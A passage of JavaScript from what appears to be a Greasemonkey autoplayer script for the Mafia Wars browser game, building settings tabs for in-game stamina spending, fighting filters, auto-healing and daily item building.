    else makeElement('input', item, {'type':'checkbox', 'name':name, 'title':locations[i], 'style':'margin-left: 0.5em;margin-right: 0.5em;', 'value':locations[i]});
    label = makeElement('label', item, {'for':name, 'title':title});
    label.appendChild(document.createTextNode(locations[i]));
  }
  makeElement('br', item,{'style':'margin-bottom:1em;'});
  item.appendChild(document.createTextNode('\'Spend Stamina Random\' will inherit the specific settings from each individual stamina spending option.<br>'));
  item.appendChild(document.createTextNode('\Please verify these specific settings before saving!'));
  makeElement('br', item,{'style':'margin-bottom:1em;'});
}

function createStaminaSubTab_FightRivals(staminaTabSub) {

  // Location setting
  tabContainerDivs(staminaTabSub);
  makeElement('label', lhs).appendChild(document.createTextNode('Fight in: '));
  id = 'fightRandomLoc';
  var fightRandomLoc = makeElement('select', lhs, {'id':id});
  for (i = 0, iLength=fightLocations.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(fightLocations[i]));
    fightRandomLoc.appendChild(choice);
  }
  fightRandomLoc.selectedIndex = GM_getValue('fightLocation', NY);

  //rehit on money gain
  title = 'Reattack until iced if money gained';
  id = 'staminaReattack';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title,'style':'margin-left: 0.5em;'});
  label.appendChild(document.createTextNode('While gaining $ '));
  //Money gain treshold
  title = 'Reattack if this amount is gained';
  id = 'reattackThreshold';
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'maxlength':6, 'style':'width: 45px; border: 1px solid #781351;', 'value':GM_getValue(id, '65000'), 'size':'1'});
  label = makeElement('label', rhs, {'for':id, 'title':title,'style':'margin-left: 0.5em;'});

  // IceCheck
  title = 'Attack ONLY live targets';
  id = 'iceCheck';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'iceCheck');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Skip iced targets'));

  // Powerattack
  title = 'Power Attack';
  id = 'staminaPowerattack';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title,'style':'margin-left: 0.5em;'});
  label.appendChild(document.createTextNode('Powerattack'));

  // Maximum level.
  tabContainerDivs(staminaTabSub);
  title = 'Avoid opponents higher than this level.';
  id = 'fightLevelMax';
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Maximum level:'));
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'maxlength':5, 'style':'width: 30px; border: 1px solid #781351;', 'value':GM_getValue('fightLevelMax', '100'), 'size':'1'});

  // Maximum level relative?
  title = 'Make the maximum level be relative to your own. For example, if your level is 10, and maximum level is set to 5, opponents higher than level 15 will be avoided.';
  id = 'fightLevelMaxRelative';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'fightLevelMaxRelative');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Add my level'));

 // Override my level check?
  title = 'Override the check for level to be the same or greater than my level - CAUTION: might cause slow fighting.';
  id = 'fightLevelMaxOverride';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'fightLevelMaxOverride');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Override level check'));

  // Maximum mafia size.
  tabContainerDivs(staminaTabSub);
  id = 'fightMafiaMax';
  title = 'Avoid opponents with mafia sizes larger than this.',
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Maximum mafia:'));
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'style':'width: 30px; border: 1px solid #781351;', 'value':GM_getValue('fightMafiaMax', '501'), 'size':'1'});

  // Maximum mafia relative?
  title = 'Make the maximum mafia size be relative to your own. For example, if you have 300 mafia members, and maximum mafia is set to 50, opponents with more than 350 mafia members will be avoided.';
  id = 'fightMafiaMaxRelative';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'fightMafiaMaxRelative');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Add my mafia size'));

  // Minimum mafia size.
  tabContainerDivs(staminaTabSub);
  id = 'fightMafiaMin';
  title = 'Avoid opponents with mafia sizes smaller than this.',
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Minimum mafia:'));
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'style':'width: 30px; border: 1px solid #781351;', 'value':GM_getValue('fightMafiaMin', '1'), 'size':'1'});

  // Minimum mafia relative?
  title = 'Make the minimum mafia size be relative to your own. For example, if you have 300 mafia members, and minimum mafia is set to 50, opponents with less than 250 mafia members will be avoided.';
  id = 'fightMafiaMinRelative';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'fightMafiaMinRelative');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Subtract from my mafia size'));

  // Mob fight
  tabContainerDivs(staminaTabSub);
  title = 'Fight higher levels if the mafia is smaller.  You mob them, overwhelm the smaller numbers';
  id = 'fightMobMode';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, 'fightMobMode');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Mob Fight'));

  // Remove stronger opponents?
  removeStrongerOpponents(staminaTabSub);
  tabContainerDivs(staminaTabSub);

  // Pattern Fighting ?
  title = ' Use Mafia Family Patterns when fighting';
  id = 'fightNames';
  var UseFightNames = makeElement('input', lhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(' Use Patterns when fighting:'));
  UseFightNames.addEventListener('click', clickUseFightNames, false);
  makeElement('br', lhs);
  id = 'fightAvoidNames';
  title = ' Avoid mafia families';
  makeElement('input', lhs, {'type':'radio', 'name':'rm3', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(title));
  makeElement('br', lhs);
  id = 'fightOnlyNames';
  title = ' Only Fight Mafia Families ';
  makeElement('input', lhs, {'type':'radio', 'name':'rm3', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(title));
  makeElement('textarea', rhs, {'style':'position: static; width: 15em; height: 6em;', 'id':'fightClanName', 'title':'Enter each pattern (such as a clan name) on a separate line.'}).appendChild(document.createTextNode(GM_getValue('fightClanName', defaultClans.join('\n'))));
  makeElement('br', rhs);
  makeElement('font', rhs, {'style':'font-size: 10px;'}).appendChild(document.createTextNode('Enter each name pattern on a separate line.'));

  // Use stealth fighting?
  tabContainerDivs(staminaTabSub);
  title = 'Prefer opponents who won\'t be notified of your attacks.';
  id = 'fightStealth';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, 'fightStealth');
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Use fight stealth'));
}

// Create New Stamina Tab
function createStaminaTab() {
  var i, elt, title, id, label, lhs, item, choice;
  var staminaTab = makeElement('div', null, {'id':'staminaTab', 'class':'tabcontent'});

  var eltCol = makeElement('div', staminaTab, {'style':'width:762px;height:25px;'});
  var eltA = makeElement('a', eltCol, {'href':'http://www.playerscripts.com/ps-mwap-forum.html','target':'_none','class':'helpLink'});

  if (gvar.isGreaseMonkey) {
    eltA = makeElement('a', eltCol, {'href':'#','alt':'update','title':'update','style':'width:43px;margin-right:10px;','class':'settingsLink'});
    eltA.appendChild(document.createTextNode('Update'));
    eltA.addEventListener('click', updateScript, false);
  }

  eltA = makeElement('a', eltCol, {'href':'#','alt':'save settings','title':'save setttings','style':'width:84px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Save Settings'));
  eltA.addEventListener('click', saveSettings, false);

  var eltForm = makeElement('form', eltCol,{'action':'https://www.paypal.com/cgi-bin/webscr','method':'post','name':'MWAPDonateLink','target':'_blank'});
  eltA = makeElement('input', eltForm,{'name':'cmd','type':'hidden','value':'_s-xclick'});
  eltA = makeElement('input', eltForm,{'name':'hosted_button_id','type':'hidden','value':'ST6BSZGFQXCUY'});
  eltA = makeElement('a', eltForm, {'name':'submit','href':'#','target':'_blank','onclick':'document.MWAPDonateLink.submit();return false;','alt':'PayPal - The safer, easier way to pay online.','title':'PayPal - The safer, easier way to pay online.','style':'width:50px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Donate'));

  var TabHeader = makeElement('div', eltCol, {'style':'width:500px;height:25px;border:none #FFFFFF;float:left;font-size: 18px; font-weight: bold;'});
  TabHeader.appendChild(document.createTextNode('Stamina Settings:'));

  // Container for a list of settings.
  var list = makeElement('div', staminaTab, {'style':'position: relative; top: 5px; margin-left: auto; margin-right: auto; width: 95%; line-height:120%;'});

  //
  // How to spend stamina (fight/hitlist).
  //
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});

  title = 'Spend stamina automatically.';
  id = 'staminaSpend';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, 'staminaSpend');
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Spend stamina to:'));

  id = 'staminaSpendHow';
  var staminaSpendHow = makeElement('select', rhs, {'id':id});
  for (i = 0, iLength=staminaSpendChoices.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(staminaSpendChoices[i]));
    staminaSpendHow.appendChild(choice);
  }

  // Stamina Speed Click
  title = 'Use Speed Clicks';
  id = 'staminaSpeedClick';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'staminaSpeedClick');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' SpeedClick'));

  // Subtab for staminaSpendHow specific settings
  var staminaTabSub = makeElement('div', list, {'id':'staminaTabSub', 'style':'position: static; border: 1px inset #FFD927; margin-left: auto; margin-right: auto; margin-top: 5px; margin-bottom: 5px;'});

  // Spend stamina option
  item = makeElement('div', list, {'class':'single'});
  title = 'Start spending stamina when stamina level is reached';
  id = 'selectStaminaUse';
  item.appendChild(document.createTextNode('Start spending stamina when '));
  makeElement('input', item, {'type':'text', 'id':id, 'title':title, 'style':'width: 2em; ', 'value':GM_getValue(id, '0')});
  id = 'selectStaminaUseMode';
  item.appendChild(document.createTextNode(' '));
  elt = makeElement('select', item, {'id':id, 'title':title});
  for (i = 0, iLength = numberSchemes.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(numberSchemes[i]));
    elt.appendChild(choice);
  }
  elt.selectedIndex = GM_getValue(id, 0);
  item.appendChild(document.createTextNode(' of stamina has accumulated.'));

  // Stamina to reserve for manual play
  item = makeElement('div', list, {'class':'single'});
  title = 'Suspend spending stamina for above choices while below this level.';
  title += '  NOTE: Missions & Stamina LOWER limits are completely INDEPENDENT Of Each Other.';
  id = 'selectStaminaKeep';
  item.appendChild(document.createTextNode('While Stamina Is Below '));
  makeElement('input', item, {'type':'text', 'id':id, 'title':title, 'style':'width: 2em; ', 'value':GM_getValue(id, '0')});
  id = 'selectStaminaKeepMode';
  item.appendChild(document.createTextNode(' '));
  elt = makeElement('select', item, {'id':id, 'title':title});
  for (i = 0, iLength = numberSchemes.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(numberSchemes[i]));
    elt.appendChild(choice);
  }
  elt.selectedIndex = GM_getValue(id, 0);
  item.appendChild(document.createTextNode(' Suspend Stamina Spending For Jobs & Fighting.'));

// drop a line
  // Stamina to reserve for manual play
  item = makeElement('div', list, {'class':'single'});
  title = 'Suspend automatic play and missions processing while below this level of stamina.';
  title += '  NOTE: Missions & Stamina LOWER limits are completely INDEPENDENT Of Each Other.';
  id = 'selectMissionStaminaKeep';  //  selectStaminaKeep
  item.appendChild(document.createTextNode('While Stamina Is Below '));
  makeElement('input', item, {'type':'text', 'id':id, 'title':title, 'style':'width: 2em; ', 'value':GM_getValue(id, '0')});
  id = 'selectMissionStaminaKeepMode'; //  selectStaminaKeepMode
  item.appendChild(document.createTextNode(' '));
  elt = makeElement('select', item, {'id':id, 'title':title});
  for (i = 0, iLength = numberSchemes.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(numberSchemes[i]));
    elt.appendChild(choice);
  }
  elt.selectedIndex = GM_getValue(id, 0);
  item.appendChild(document.createTextNode(' Suspend Stamina Spending For Missions.'));

  // Level up
  item = makeElement('div', list, {'class':'single'});
  title = 'Ignore minimum stamina settings if a level up is within reach.';
  id = 'allowStaminaToLevelUp';
  makeElement('input', item, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, 'allowStaminaToLevelUp');
  label = makeElement('label', item, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Don\'t reserve stamina if within reach of the next level.'));

  // Handler for switching sub-areas.
  var handleSpendChanged = function() {
    staminaTabSub.innerHTML = '';
    // Create the appropriate SubTab
    var i = staminaSpendHow.selectedIndex;
    switch(i){
      case STAMINA_HOW_FIGHT_RANDOM :
        createStaminaSubTab_FightRandom(staminaTabSub);
        break;
      case STAMINA_HOW_FIGHT_LIST :
        createStaminaSubTab_FightSpecific(staminaTabSub);
        break;
      case STAMINA_HOW_HITMAN :
        createStaminaSubTab_CollectBounties(staminaTabSub);
        break;
      case STAMINA_HOW_ROBBING :
        createStaminaSubTab_Rob(staminaTabSub);
        break;
      case STAMINA_HOW_AUTOHITLIST :
        createStaminaSubTab_SetBounties(staminaTabSub);
        break;
      case STAMINA_HOW_RANDOM :
        createStaminaSubTab_Random(staminaTabSub);
        break;
      case STAMINA_HOW_FIGHTROB :
        createStaminaSubTab_FightRob(staminaTabSub);
        break;
      case STAMINA_HOW_FIGHTRIVALS_ROB :
        createStaminaSubTab_FightRivals_Rob(staminaTabSub);
        break;
      case STAMINA_HOW_FIGHT_RIVALS :
        createStaminaSubTab_FightRivals(staminaTabSub);
        break;
//newchange_fight
//      case STAMINA_HOW_LVJOBFIGHT :
//        createStaminaSubTab_LVJobFight(staminaTabSub);
//        break;
      default :
        createStaminaSubTab_Random(staminaTabSub);
        break;
    }
  }

  staminaSpendHow.selectedIndex = GM_getValue('staminaSpendHow', 0);
  handleSpendChanged();
  staminaSpendHow.addEventListener('change', handleSpendChanged, false);

  return staminaTab;
}

// Create Heal Tab
function createHealTab() {
  var elt, title, id, label, item, lhs, rhs, i, choice;
  var healTab = makeElement('div', null, {'id':'healTab', 'class':'tabcontent'});

    var eltCol = makeElement('div', healTab, {'style':'width:762px;height:25px;'});
  var eltA = makeElement('a', eltCol, {'href':'http://www.playerscripts.com/ps-mwap-forum.html','target':'_none','class':'helpLink'});

  if (gvar.isGreaseMonkey) {
    eltA = makeElement('a', eltCol, {'href':'#','alt':'update','title':'update','style':'width:43px;margin-right:10px;','class':'settingsLink'});
    eltA.appendChild(document.createTextNode('Update'));
    eltA.addEventListener('click', updateScript, false);
  }

  eltA = makeElement('a', eltCol, {'href':'#','alt':'save settings','title':'save setttings','style':'width:84px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Save Settings'));
  eltA.addEventListener('click', saveSettings, false);

  var eltForm = makeElement('form', eltCol,{'action':'https://www.paypal.com/cgi-bin/webscr','method':'post','name':'MWAPDonateLink','target':'_blank'});
  eltA = makeElement('input', eltForm,{'name':'cmd','type':'hidden','value':'_s-xclick'});
  eltA = makeElement('input', eltForm,{'name':'hosted_button_id','type':'hidden','value':'ST6BSZGFQXCUY'});
  eltA = makeElement('a', eltForm, {'name':'submit','href':'#','target':'_blank','onclick':'document.MWAPDonateLink.submit();return false;','alt':'PayPal - The safer, easier way to pay online.','title':'PayPal - The safer, easier way to pay online.','style':'width:50px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Donate'));

  var TabHeader = makeElement('div', eltCol, {'style':'width:500px;height:25px;border:none #FFFFFF;float:left;font-size: 18px; font-weight: bold;'});
  TabHeader.appendChild(document.createTextNode('Health Settings:'));

  // Container for a list of settings.
   var list = makeElement('div', healTab, {'style':'position: relative; top: 10px; margin-left: 0px; margin-right: auto; width: 95%; line-height:120%;'});

  // Healing options
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Heal when health lands below indicated health.';
  id = 'autoHeal';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id, 'checked');
  makeElement('img', lhs, {'style':'padding-left: 5px;','src':stripURI(healthIcon)});
  makeElement('label', lhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Heal in:'));
  id = 'healLocation';
  var healLocation = makeElement('select', rhs, {'id':id});
  for (i = 0, iLength=locations.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(locations[i]));
    healLocation.appendChild(choice);
  }

  healLocation.selectedIndex = GM_getValue('healLocation', NY);
  makeElement('label', rhs, {'title':title}).appendChild(document.createTextNode(' when health falls below '));
  makeElement('input', rhs, {'style':'text-align: center','type':'text', 'value':GM_getValue('healthLevel', '50'), 'id':'healthLevel', 'size':'1'});
  makeElement('label', rhs, {'title':title}).appendChild(document.createTextNode(' points'));

  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});

  // Attack at critical health
  makeElement('br', rhs, {'class':'hide'});
  title = 'Check to attack even when at critical health (21-28 health points) ';
  id = 'attackCritical';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('img', rhs, {'style':'padding-left: 5px;','src':stripURI(attackIcon)});
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Attack at critical health'));

  // Hide in hospital
  makeElement('br', rhs, {'class':'hide'});
  title = 'Hide in hospital ';
  id = 'hideInHospital';
  var hideInHosp = makeElement('input', rhs, {'type':'checkbox', 'title':title, 'id':id, 'value':'checked'}, id);
  makeElement('img', rhs, {'style':'padding-left: 5px;','src':stripURI(hideIcon)});
  title = hideInHosp.checked ? ' Hide in hospital but...' : ' Hide in hospital';
  makeElement('label', rhs, {'id':'hideLabel', 'for':id, 'title':title}).appendChild(document.createTextNode(title));

  elt = makeElement('div', rhs, {'style':'position: relative; line-height: 150%; left: 17px;','id':'hideOpts'});
  for (i = 0, iLength=healOptions.length; i < iLength; i++) {
    id = healOptions[i][0];
    title = healOptions[i][1];
    var info = healOptions[i][2];
    var optElt = makeElement('div', elt);
    makeElement('input', optElt, {'type':'checkbox', 'id':id, 'title':info, 'value':'checked'}, id);
    label = makeElement('label', optElt, {'for':id, 'title':info});
    label.appendChild(document.createTextNode(' ' + title));
  }
  elt.style.display = hideInHosp.checked ? '' : 'none';

  var hideHandler = function() {
    var hideOpts = document.getElementById('hideOpts');
    var hideLabel = document.getElementById('hideLabel');
    if (!hideOpts) return false;
    if (this.checked) {
      hideOpts.style.display = '';
      hideLabel.firstChild.nodeValue = ' Hide in hospital but...';
    } else {
      hideOpts.style.display = 'none';
      hideLabel.firstChild.nodeValue = ' Hide in hospital';
    }
    return true;
  };
  hideInHosp.addEventListener('click', hideHandler, false);

  // stamina minimum to allow healing
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Set the minimum Stamina Points Needed for Auto-Heal.';
  label = makeElement('label', lhs, {'title':title});
  label.appendChild(document.createTextNode('Disable Auto-Heal when Stamina falls below:'));
  makeElement('input', rhs, {'type':'text', 'value':GM_getValue('stamina_min_heal', '22'), 'id':'stamina_min_heal', 'size':'3'});
  rhs.appendChild(document.createTextNode(' points'));

  // Hitlist riding
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'hideAttacks';
  title = 'Enable hitlist riding: PS MWAP disables autoHeal after you got XP from attacks; it enables it again after parsing a snuffed message.';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Hitlist riding, turn off autoHeal after '));
  id = 'rideHitlistXP';
  title = 'Enter the XP you want to gain before PS MWAP turns off autoHeal. Enter \'0\' if you want PS MWAP to turn off autoHeal after it detected a 0 xp attack.';
  makeElement('input', rhs, {'type':'text', 'value':GM_getValue(id, '0'), 'title':title, 'id':id, 'style':'width: 25px'});
  rhs.appendChild(document.createTextNode(' xp'));

  // Health reserve
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'stopPA';
  title = 'do not use Powerattack when health is below treshold';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Do not use Power Attack when health falls below  '));
  id = 'stopPAHealth';
  title = 'Enter min health level';
  makeElement('input', rhs, {'type':'text', 'value':GM_getValue(id, '0'), 'title':title, 'id':id, 'style':'width: 25px'});

  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  return healTab;

}

// Create Cash tab
function createCashTab () {
  var elt, title, id, label;
  var cashTab = makeElement('div', null, {'id':'cashTab', 'class':'tabcontent'});

  var eltCol = makeElement('div', cashTab, {'style':'width:762px;height:25px;'});
  var eltA = makeElement('a', eltCol, {'href':'http://www.playerscripts.com/ps-mwap-forum.html','target':'_none','class':'helpLink'});

  if (gvar.isGreaseMonkey) {
    eltA = makeElement('a', eltCol, {'href':'#','alt':'update','title':'update','style':'width:43px;margin-right:10px;','class':'settingsLink'});
    eltA.appendChild(document.createTextNode('Update'));
    eltA.addEventListener('click', updateScript, false);
  }

  eltA = makeElement('a', eltCol, {'href':'#','alt':'save settings','title':'save setttings','style':'width:84px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Save Settings'));
  eltA.addEventListener('click', saveSettings, false);

  var eltForm = makeElement('form', eltCol,{'action':'https://www.paypal.com/cgi-bin/webscr','method':'post','name':'MWAPDonateLink','target':'_blank'});
  eltA = makeElement('input', eltForm,{'name':'cmd','type':'hidden','value':'_s-xclick'});
  eltA = makeElement('input', eltForm,{'name':'hosted_button_id','type':'hidden','value':'ST6BSZGFQXCUY'});
  eltA = makeElement('a', eltForm, {'name':'submit','href':'#','target':'_blank','onclick':'document.MWAPDonateLink.submit();return false;','alt':'PayPal - The safer, easier way to pay online.','title':'PayPal - The safer, easier way to pay online.','style':'width:50px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Donate'));

  var TabHeader = makeElement('div', eltCol, {'style':'width:500px;height:25px;border:none #FFFFFF;float:left;font-size: 18px; font-weight: bold;'});
  TabHeader.appendChild(document.createTextNode('Cash / Properties Settings:'));

  var xTop = 0;

  // Option to build a car
  xTop += 25;
  title = 'Check this to build a car every 24 hours';
  id = 'buildCar';
  var buildCar = makeElement('div', cashTab, {'style':'top: '+xTop+'px;'});
  makeElement('input', buildCar, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  label = makeElement('label', buildCar, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Build Car'));

  // Car list
  id = 'buildCarId';
  var carType = makeElement('select', buildCar, {'id':id, 'style':'position: static; margin-left: 5px;'});
  for (i = 0, iLength=cityCars.length; i < iLength; ++i) {
    var choice = makeElement('option', null, {'value':i,'title':cityCars[i][2]});
    choice.appendChild(document.createTextNode(cityCars[i][0]));
    carType.appendChild(choice);
  }
  carType.selectedIndex = GM_getValue(id, 8);
  carType.setAttribute('title', cityCars[carType.selectedIndex][2]);

  // Option to build a weapon
  xTop += 25;
  title = 'Check this to build a weapon every 24 hours';
  id = 'buildWeapon';
  var buildWeapon = makeElement('div', cashTab, {'style':'top: '+xTop+'px;'});
  makeElement('input', buildWeapon, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  label = makeElement('label', buildWeapon, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Build Weapon'));

  // Weapon list
  id = 'buildWeaponId';
  var weaponType = makeElement('select', buildWeapon, {'id':id, 'style':'position: static; margin-left: 5px;'});
  for (i = 0, iLength=cityWeapons.length; i < iLength; ++i) {
    var choice = makeElement('option', null, {'value':i,'title':cityWeapons[i][2]});
    choice.appendChild(document.createTextNode(cityWeapons[i][0]));
    weaponType.appendChild(choice);
  }
  weaponType.selectedIndex = GM_getValue(id, 7);
  weaponType.setAttribute('title', cityWeapons[weaponType.selectedIndex][2]);

  // Option to build an armor
  xTop += 25;
  title = 'Check this to build a armor every 24 hours';
  id = 'buildArmor';
  var buildArmor = makeElement('div', cashTab, {'style':'top: '+xTop+'px;'});
  makeElement('input', buildArmor, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  label = makeElement('label', buildArmor, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Build Armor'));

  // Armor list
  id = 'buildArmorId';
  var armorType = makeElement('select', buildArmor, {'id':id, 'style':'position: static; margin-left: 5px;'});
  for (i = 0, iLength=cityArmor.length; i < iLength; ++i) {
    var choice = makeElement('option', null, {'value':i,'title':cityArmor[i][2]});
    choice.appendChild(document.createTextNode(cityArmor[i][0]));
    armorType.appendChild(choice);
  }
  armorType.selectedIndex = GM_getValue(id, 7);
  armorType.setAttribute('title', cityArmor[armorType.selectedIndex][2]);

  // Option to build an animal
  xTop += 25;
  title = 'Check this to build an animal every 24 hours';
  id = 'buildAnimal';
  var buildAnimal = makeElement('div', cashTab, {'style':'top: '+xTop+'px;'});
  makeElement('input', buildAnimal, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  label = makeElement('label', buildAnimal, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Build Animal'));

  // Armor list
  id = 'buildAnimalId';
  var animalType = makeElement('select', buildAnimal, {'id':id, 'style':'position: static; margin-left: 5px;'});
  for (i = 0, iLength=cityAnimals.length; i < iLength; ++i) {
    var choice = makeElement('option', null, {'value':i,'title':cityAnimals[i][2]});
    choice.appendChild(document.createTextNode(cityAnimals[i][0]));
    animalType.appendChild(choice);
  }
  animalType.selectedIndex = GM_getValue(id, 7);
  animalType.setAttribute('title', cityAnimals[animalType.selectedIndex][2]);

  // Option to build Port item
  xTop += 25;
  title = 'Check this to build a port inventory item every 24 hours';
  id = 'buildPort';
  var buildPort = makeElement('div', cashTab, {'style':'top: '+xTop+'px;'});
  makeElement('input', buildPort, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  label = makeElement('label', buildPort, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Build Port'));

  // Port list
  id = 'buildPortId';
  var portType = makeElement('select', buildPort, {'id':id, 'style':'position: static; margin-left: 5px;'});
  for (i = 0, iLength=cityPort.length; i < iLength; ++i) {
    var choice = makeElement('option', null, {'value':i,'title':cityPort[i][2]});
    choice.appendChild(document.createTextNode(cityPort[i][0]));
    portType.appendChild(choice);
  }
  portType.selectedIndex = GM_getValue(id, 7);
  portType.setAttribute('title', cityPort[portType.selectedIndex][2]);

  // Ask for Chop Shop Parts
  xTop += 40;
  title = 'Check this to Ask for Chop Shop Parts every 12 hours';
  id = 'askShopParts';
  var shopParts = makeElement('div', cashTab, {'style':'top: '+xTop+'px;'});
  makeElement('font', shopParts, {'style':'font-size: 10px;'}).appendChild(document.createTextNode('This may result in some delay, when the request is not ready for processing.'));
  makeElement('br', shopParts);
  makeElement('input', shopParts, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  label = makeElement('label', shopParts, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Ask for Chop Shop Parts'));

  // List Chop Shop Parts
  id = 'askShopPartsId';
  var shopPartsType = makeElement('select', shopParts, {'id':id, 'style':'position: static; margin-left: 5px;'});
  for (i = 0, iLength=cityShopParts.length; i < iLength; ++i) {
    var choice = makeElement('option', null, {'value':i,'title':cityShopParts[i][0]});
    choice.appendChild(document.createTextNode(cityShopParts[i][0]));
    shopPartsType.appendChild(choice);
  }
  shopPartsType.selectedIndex = GM_getValue(id, 0);

  // Ask for Weapon Depots Parts
  xTop += 45;
  title = 'Check this to Ask for Weapon Depots Parts every 12 hours';
  id = 'askDepotParts';
  var depotParts = makeElement('div', cashTab, {'style':'top: '+xTop+'px;'});
  makeElement('input', depotParts, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  label = makeElement('label', depotParts, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Ask for Weapon Depots Parts'));

  // List Weapon Depots Parts
  id = 'askDepotPartsId';
  var depotPartsType = makeElement('select', depotParts, {'id':id, 'style':'position: static; margin-left: 5px;'});
  for (i = 0, iLength=cityDepotParts.length; i < iLength; ++i) {
